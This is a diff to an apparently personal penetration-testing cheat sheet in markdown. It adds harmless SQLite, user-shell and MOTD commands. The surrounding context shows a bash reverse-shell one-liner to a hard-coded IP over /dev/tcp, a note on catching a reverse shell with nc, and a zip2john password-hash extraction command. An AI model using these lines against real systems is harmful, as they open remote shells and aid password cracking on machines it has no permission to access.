@@ -182,6 +182,29 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
 ##################################################################
 -->
 
+## SQLite
+
+### Access Database
+
+`sqlite3 databasename`
+
+### Show Tables
+
+`.tables`
+
+### Show Table Info
+
+`PRAGMA table_info(tablename)`
+
+### Dump Info From Table
+
+`SELECT * FROM tablename`
+
+<!--
+##################################################################
+##################################################################
+-->
+
 ## Useful Commands
 
 ### Grep IPs out of file
@@ -229,3 +252,13 @@ run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will g
 ### Pull Hash from Password Protected Zip
 
 `zip2john file.zip > hash`
+
+### Find Specific Users Shell Type
+
+`finger $USER | grep 'Shell:*' | cut -f3 -d ":"`
+`getent passwd $LOGNAME | cut -d: -f7`
+
+#### Show MOTD
+
+`cat /run/motd.dynamic`
+`sudo run-parts /etc/update-motd.d/`
